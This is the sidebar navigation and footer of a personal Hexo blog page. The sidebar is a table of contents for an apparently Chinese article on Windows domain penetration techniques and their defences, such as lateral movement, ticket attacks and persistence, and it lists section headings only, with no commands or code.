href="#%E4%B8%89%EF%BC%9A%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83"><span class="nav-text">三：组策略首选项提权分析及防范</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%B7%A5%E5%85%B7"><span class="nav-text">1.工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-text">2.防御措施</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%EF%BC%9A%E7%BB%95%E8%BF%87UAC%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83"><span class="nav-text">四：绕过UAC提权分析及防范</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%EF%BC%9A%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83"><span class="nav-text">五：令牌窃取分析及防范</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%EF%BC%9A%E6%97%A0%E5%87%AD%E8%AF%81%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83"><span class="nav-text">六：无凭证条件下的权限获取分析及防范</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90%E5%92%8C%E9%98%B2%E5%BE%A1"><span class="nav-text">横向移动分析和防御</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%EF%BC%9AIPC%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="nav-text">一：IPC远程连接及相关命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%8E%9F%E7%90%86"><span class="nav-text">1.原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-text">2.利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E4%BD%BF%E7%94%A8Windows%E8%87%AA%E5%B8%A6%E7%9A%84%E5%B7%A5%E5%85%B7%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-text">3.使用Windows自带的工具获取远程主机信息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%BB%BA%E7%AB%8B%E5%88%A0%E9%99%A4"><span class="nav-text">1) 建立删除</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-dir%E5%91%BD%E4%BB%A4"><span class="nav-text">2) dir命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-tasklist%E4%BB%BB%E5%8A%A1"><span class="nav-text">3) tasklist任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-at%E5%91%BD%E4%BB%A4%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-text">4) at命令计划任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-schtasks%E5%91%BD%E4%BB%A4%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-text">5) schtasks命令计划任务</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-sc%E5%88%9B%E5%BB%BA%E4%BB%BB%E5%8A%A1"><span class="nav-text">4.sc创建任务</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%EF%BC%9AWindows%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96%E5%88%86%E6%9E%90"><span class="nav-text">二：Windows散列值获取分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%8D%95%E6%9C%BA%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E4%B8%8E%E9%98%B2%E8%8C%83"><span class="nav-text">1.单机密码抓取与防范</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E9%80%9A%E8%BF%87SAM%E5%92%8CSystem%E6%96%87%E4%BB%B6%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="nav-text">2.通过SAM和System文件抓取密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E4%BD%BF%E7%94%A8mimikatz%E5%9C%A8%E7%BA%BF%E8%AF%BB%E5%8F%96sam%E6%96%87%E4%BB%B6"><span class="nav-text">3.使用mimikatz在线读取sam文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E4%BD%BF%E7%94%A8mimikatz%E7%A6%BB%E7%BA%BF%E8%AF%BB%E5%8F%96lsass-dmp%E6%96%87%E4%BB%B6"><span class="nav-text">4.使用mimikatz离线读取lsass.dmp文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E4%BD%BF%E7%94%A8PowerShell%E5%AF%B9%E6%95%A3%E5%88%97%E5%80%BC%E8%BF%9B%E8%A1%8CDump%E6%93%8D%E4%BD%9C"><span class="nav-text">5.使用PowerShell对散列值进行Dump操作</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%EF%BC%9A%E5%8D%95%E6%9C%BA%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E9%98%B2%E8%8C%83"><span class="nav-text">三：单机密码抓取防范</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Wdigest%E9%98%B2%E6%AD%A2%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="nav-text">1.Wdigest防止明文密码泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E8%AE%BE%E7%BD%AEActive-Directory-2012-R2%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB"><span class="nav-text">2.设置Active Directory 2012 R2功能级别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1mimikatz%E6%94%BB%E5%87%BB"><span class="nav-text">3.防御mimikatz攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%EF%BC%9A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%EF%BC%88PTH-PTK%EF%BC%89"><span class="nav-text">四：哈希传递攻击（PTH.PTK）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BD%BF%E7%94%A8NTLM-Hash%E8%BF%9B%E8%A1%8C%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="nav-text">1.使用NTLM Hash进行哈希传递攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-2"><span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%BD%BF%E7%94%A8AES-256%E5%AF%86%E9%92%A5%E8%BF%9B%E8%A1%8C%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="nav-text">2.使用AES-256密钥进行哈希传递攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%EF%BC%9A%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%EF%BC%88PTT%EF%BC%89"><span class="nav-text">五：票据传递攻击（PTT）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-mimkatz%E5%AF%BC%E5%87%BA%E7%A5%A8%E6%8D%AE"><span class="nav-text">1.mimkatz导出票据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8ms14-068%E6%BC%8F%E6%B4%9E"><span class="nav-text">2.利用ms14-068漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%EF%BC%9APsExec%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">六：PsExec的使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-PsTools%E5%B7%A5%E5%85%B7%E5%8C%85%E4%B8%AD%E7%9A%84PsExec"><span class="nav-text">1.PsTools工具包中的PsExec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Metasploit%E4%B8%AD%E7%9A%84PsExec"><span class="nav-text">2.Metasploit中的PsExec</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%EF%BC%9AWMI%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">七：WMI的使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="nav-text">基本命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%EF%BC%9Aimpacket%E5%B7%A5%E5%85%B7%E5%8C%85%E4%B8%AD%E7%9A%84wmiexec"><span class="nav-text">八：impacket工具包中的wmiexec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%EF%BC%9AInvoke-WmiCommand"><span class="nav-text">九：Invoke-WmiCommand</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%EF%BC%9Asmbexec%E4%BD%BF%E7%94%A8"><span class="nav-text">十：smbexec使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%80%EF%BC%9ADOM%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">十一：DOM在远程系统中的使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0DCOM%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">1.通过本地DCOM执行命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E8%8E%B7%E5%8F%96DCOM%E7%A8%8B%E5%BA%8F%E5%88%97%E8%A1%A8"><span class="nav-text">1) 获取DCOM程序列表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E4%BD%BF%E7%94%A8DCOM%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4"><span class="nav-text">2) 使用DCOM执行任意命令</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%BD%BF%E7%94%A8DCOM%E5%9C%A8%E8%BF%9C%E7%A8%8B%E6%9C%BA%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">2.使用DCOM在远程机器上执行命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E9%80%9A%E8%BF%87-ipc%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8B%E8%AE%A1%E7%AE%97%E6%9C%BA"><span class="nav-text">1) 通过$ipc连接远程计算机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">2) 执行命令</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%BA%8C%EF%BC%9ASPN"><span class="nav-text">十二：SPN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Kerberos"><span class="nav-text">1.Kerberos</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-SPN"><span class="nav-text">2.SPN</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5"><span class="nav-text">相关概念</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81-SPN-%E6%9C%8D%E5%8A%A1"><span class="nav-text">常见 SPN 服务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SPN-%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC"><span class="nav-text">SPN 扫描脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#setspn"><span class="nav-text">setspn</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Active-Directory-%E6%A8%A1%E5%9D%97"><span class="nav-text">Active Directory 模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PowerView"><span class="nav-text">PowerView</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Powershell-AD-Recon"><span class="nav-text">Powershell-AD-Recon</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#kerberoast"><span class="nav-text">kerberoast</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PowerShellery"><span class="nav-text">PowerShellery</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Impacket"><span class="nav-text">Impacket</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-kerberoast"><span class="nav-text">3.kerberoast</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8"><span class="nav-text">域控制器安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%EF%BC%9AGPP%E8%A7%A3%E5%AF%86"><span class="nav-text">一：GPP解密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%EF%BC%9A%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D%E6%9C%8D%E5%8A%A1%E6%8F%90%E5%8F%96ntds-dit"><span class="nav-text">二：卷影拷贝服务提取ntds.dit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%EF%BC%9A%E5%88%A9%E7%94%A8dcsync%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-text">三：利用dcsync获取域散列值</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%EF%BC%9A%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="nav-text">四：票据传递攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%EF%BC%9AExchange%E6%BC%8F%E6%B4%9E"><span class="nav-text">五：Exchange漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%EF%BC%9AKerberos-%E5%9F%9F%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="nav-text">六：Kerberos 域用户提权漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-PyKEK"><span class="nav-text">1.PyKEK</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-GoldenPac"><span class="nav-text">2.GoldenPac</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-kekeo"><span class="nav-text">3.kekeo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-MSF"><span class="nav-text">4.MSF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-CS"><span class="nav-text">5.CS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%EF%BC%9A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-text">七：黄金票据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80-1"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%AF%BC%E5%87%BA-krbtgt-%E7%9A%84-NTLM-Hash"><span class="nav-text">1.导出 krbtgt 的 NTLM Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E8%8E%B7%E5%8F%96%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-text">2.获取基本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-text">3.制作黄金票据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E9%AA%8C%E8%AF%81%E6%9D%83%E9%99%90"><span class="nav-text">4.验证权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-MSF-%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">5.MSF 下的利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%EF%BC%9A%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="nav-text">八：白银票据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80-2"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BC%AA%E9%80%A0-CIFS-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="nav-text">1.伪造 CIFS 服务权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%BC%AA%E9%80%A0-LDAP-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="nav-text">2.伪造 LDAP 服务权限</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%EF%BC%9A%E9%87%91%E7%A5%A8%E5%92%8C%E9%93%B6%E7%A5%A8%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-text">九：金票和银票的区别</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%8E%B7%E5%8F%96%E7%9A%84%E6%9D%83%E9%99%90%E4%B8%8D%E5%90%8C"><span class="nav-text">1.获取的权限不同</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E4%B8%8D%E5%90%8C"><span class="nav-text">2.认证流程不同</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E4%B8%8D%E5%90%8C"><span class="nav-text">3.加密方式不同</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90"><span class="nav-text">跨域攻击分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%EF%BC%9A%E8%8E%B7%E5%8F%96%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="nav-text">一：获取域信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%EF%BC%9A%E5%88%A9%E7%94%A8%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%AF%86%E9%92%A5%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E5%9F%9F%E6%9D%83%E9%99%90"><span class="nav-text">二：利用域信任密钥获取目标域权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%EF%BC%9A%E5%88%A9%E7%94%A8-krbtgt-%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E5%9F%9F%E7%9A%84%E6%9D%83%E9%99%90"><span class="nav-text">三：利用 krbtgt 散列值获取目标域的权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%EF%BC%9A%E5%88%A9%E7%94%A8%E6%97%A0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%92%8C-MS-RPRN-%E8%8E%B7%E5%8F%96%E4%BF%A1%E4%BB%BB%E6%9E%97%E6%9D%83%E9%99%90"><span class="nav-text">四：利用无约束委派和 MS-RPRN 获取信任林权限</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-text">权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%EF%BC%9AWindows-%E4%B8%BB%E6%9C%BA%E5%90%8E%E9%97%A8"><span class="nav-text">一：Windows 主机后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%9A%90%E8%97%8F%E8%B4%A6%E5%8F%B7"><span class="nav-text">1.隐藏账号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-text">2.计划任务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-shift-%E5%90%8E%E9%97%A8"><span class="nav-text">3.shift 后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E7%BB%84%E7%AD%96%E7%95%A5"><span class="nav-text">4.组策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="nav-text">5.注册表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E6%9C%8D%E5%8A%A1%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="nav-text">6.服务自启动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-nishang-%E5%90%8E%E9%97%A8"><span class="nav-text">7.nishang 后门</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP-Backdoor"><span class="nav-text">HTTP-Backdoor</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Add-ScrnSaveBackdoor"><span class="nav-text">Add-ScrnSaveBackdoor</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%EF%BC%9AWindows-%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F"><span class="nav-text">二：Windows 文件隐藏</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%96%87%E4%BB%B6%E5%B1%9E%E6%80%A7"><span class="nav-text">1.文件属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-ADS"><span class="nav-text">2.ADS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E5%A4%B9%E4%BC%AA%E8%A3%85"><span class="nav-text">3.系统文件夹伪装</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%EF%BC%9A%E5%9F%9F%E5%90%8E%E9%97%A8"><span class="nav-text">三：域后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-text">1.黄金票据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="nav-text">2.白银票据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-SSP-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-text">3.SSP 权限维持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-SID-History-%E5%90%8E%E9%97%A8"><span class="nav-text">4.SID History 后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="nav-text">5.万能密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%EF%BC%9ALinux-%E4%B8%BB%E6%9C%BA%E5%90%8E%E9%97%A8"><span class="nav-text">四：Linux 主机后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7"><span class="nav-text">1.添加用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-SUID-Shell"><span class="nav-text">2.SUID Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%BD%AF%E9%93%BE%E6%8E%A5"><span class="nav-text">3.软链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-strace-%E5%90%8E%E9%97%A8"><span class="nav-text">4.strace 后门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%EF%BC%9ALinux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="nav-text">五：Linux 隐藏文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E6%97%B6%E9%97%B4%E6%88%B3"><span class="nav-text">1.隐藏文件时间戳</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E9%9A%90%E8%BA%AB%E7%99%BB%E5%BD%95"><span class="nav-text">2.隐身登录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%94%81%E5%AE%9A%E6%96%87%E4%BB%B6"><span class="nav-text">3.锁定文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E9%9A%90%E8%97%8F%E5%8E%86%E5%8F%B2%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95"><span class="nav-text">4.隐藏历史操作记录</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">apsry</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">14</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">apsry</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
